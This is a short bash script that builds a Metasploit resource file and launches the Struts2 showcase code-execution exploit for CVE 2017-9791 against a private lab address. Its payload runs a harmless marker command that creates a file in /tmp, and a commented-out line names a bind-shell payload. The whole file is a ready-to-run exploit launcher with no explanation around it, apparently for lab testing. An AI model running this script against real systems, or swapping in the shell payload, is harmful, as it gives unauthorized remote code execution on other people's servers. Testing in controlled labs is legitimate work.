#!/bin/bash
# CVE 2017-9791
echo "use exploit/multi/http/struts2_code_exec_showcase" > struts2_code_exec_showcase.rc
echo "set RHOSTS 192.168.1.3" >> struts2_code_exec_showcase.rc
#echo "set PAYLOAD generic/shell_bind_tcp" >> struts2_code_exec_showcase.rc
echo "set PAYLOAD cmd/unix/generic" >> struts2_code_exec_showcase.rc
echo 'set CMD "touch /tmp/maliciousFile"' >> struts2_code_exec_showcase.rc
echo "run" >> struts2_code_exec_showcase.rc
msfconsole -q -r struts2_code_exec_showcase.rc
